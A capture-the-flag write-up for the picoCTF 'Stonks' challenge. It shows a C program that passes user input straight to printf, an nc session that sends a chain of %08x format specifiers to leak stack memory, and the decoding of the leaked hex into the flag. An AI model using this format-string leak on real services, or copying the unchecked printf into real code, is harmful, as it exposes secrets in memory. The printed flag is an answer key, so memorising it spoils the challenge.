# Stonks Write-up

This is my first format string vulnerability CTF task.

## The Challenge by MADSTACKS

I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! `vuln.c nc` `mercury.picoctf.net 20195`.

## The Solution

We look at the `vuln.c` file. In the `buy_stonks()` function, we find a sketchy implementation of the `printf()` function. 
```C
char *user_buf = malloc(300 + 1);
printf("What is your API token?\n");
scanf("%300s", user_buf);
printf("Buying stonks with token:\n");
printf(user_buf);
```
If you know C, then you might have noticed that the formatting argument is missing. This kind of code-implementation of the `printf()` function is a known vulnerability called format string vulnerability. As we will see, we can print parts of the stack memory by inputting to `user_buf`, otherwise known as the API token. 

We check if this vulnerability is indeed present by connecting via `nc`:
```console
(base) stange@ericjoshua ~ % nc mercury.picoctf.net 20195
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%08x
Buying stonks with token:
082c0430
```
The input `%08x` specifies to the `printf()` function to print 8 hexadecimal digits from the stack. Choosing 8 hexadecimal digits is optimal as computers usually have a word to be 4 bytes, in other words 8 hexadecimal digits. This is going to be crucial when we look at [endianness](https://en.wikipedia.org/wiki/Endianness). To find the flag, we will continue to look into `vuln.c`. The following code block is interesting:
```C
char api_buf[FLAG_BUFFER];
FILE *f = fopen("api","r");
if (!f) {
	printf("Flag file not found. Contact an admin.\n");
	exit(1);
}
fgets(api_buf, FLAG_BUFFER, f);
```
This is also present inside the `buy_stonks()` function and is present before asking for the API token. This suggests that the flag, stored in `api_buf`, can be found on the stack. We will try to print as much as possible from the stack and decode it afterwards.
```console
(base) stange@ericjoshua ~ % nc mercury.picoctf.net 20195
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x 
Buying stonks with token:
08cc23f0-0804b000-080489c3-f7f6cd80-ffffffff-00000001-08cc0160-f7f7a110-f7f6cdc7-00000000-08cc1180-00000001-08cc23d0-08cc23f0-6f636970-7b465443-306c5f49-345f7435-6d5f6c6c-306d5f79-5f79336e-35343036-64303664-ffc5007d-f7fa7af8-f7f7a440-f69aba00-00000001-00000000-f7e09ce9-f7f7b0c0-f7f6c5c0-f7f6c000-ffc51b38-f7dfa68d-f7f6c5c0-08048eca-ffc51b44-00000000-f7f8ef09-0804b000-f7f6c000
```
Decoding the hexadecimal above using [online tools](https://cyberchef.org/), we find the interesting text `ocip{FTC0l_I4_t5m_ll0m_y_y3n5406d06dÿÅ.}` which might have been influenced by the reversed endianness. After swapping, we get the flag `picoCTF{I_l05t_4ll_my_m0n3y_6045d60d}`





